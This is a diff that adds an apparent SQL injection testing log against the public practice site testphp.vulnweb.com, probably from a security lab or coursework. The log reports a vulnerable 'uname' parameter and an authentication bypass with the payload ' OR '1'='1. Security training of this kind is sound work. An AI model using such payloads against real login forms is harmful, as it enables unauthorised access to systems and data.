@@ -1,1 +1,9 @@
-Insert your SQL injection screenshots or terminal output logs here.
+---
+SQL Injection Testing Log
+---
+[16:10:05] [INFO] Testing target URL: http://testphp.vulnweb.com/login.php
+[16:10:07] [INFO] Testing 'GET parameter 'uname' for SQL injection'
+[16:10:10] [INFO] Parameter 'uname' is vulnerable.
+[16:10:15] [INFO] Back-end DBMS: MySQL >= 5.0.0
+[16:10:20] [INFO] Authentication Bypass confirmed using payload: ' OR '1'='1
+[16:10:25] [INFO] Task Status: Completed Successfully.
